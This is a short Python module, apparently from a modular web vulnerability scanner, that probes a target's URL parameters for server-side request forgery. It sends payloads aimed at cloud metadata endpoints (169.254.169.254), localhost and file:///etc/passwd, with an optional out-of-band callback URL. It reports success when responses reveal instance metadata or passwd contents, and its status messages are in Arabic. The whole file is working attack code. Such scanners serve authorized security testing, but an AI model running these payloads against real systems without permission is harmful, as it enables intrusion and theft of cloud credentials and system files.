# ssrf.py — SSRF
import random, urllib.parse
from core.registry import module
from core.helpers import norm_target, get_params
from core.http import get
from core.wordlists import COMMON_PARAMS

@module("ssrf", "web", "SSRF")
def run(turl, a, R):
    ck = getattr(a, "callback", None)
    base = norm_target(turl)
    if not ck: R.info("--callback لرصد الاتصالات الواردة (يوصى به)")
    for p in get_params(turl) or COMMON_PARAMS:
        pays = ["http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/computeMetadata/v1/",
                "http://127.0.0.1:80/", "file:///etc/passwd"]
        if ck: pays.insert(0, ck.rstrip("/") + "/ssrf/" + str(random.randint(1000,9999)))
        for pay in pays:
            st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
            if "ami-id" in b or "instance-id" in b or "i-" in b[:500]:
                R.vuln(f"SSRF في {p}: وصل إلى metadata AWS!")
            elif "root:" in b and "/bin/" in b:
                R.vuln(f"SSRF (file://) في {p}: قرأ /etc/passwd")
    R.info("اكتمل فحص SSRF")
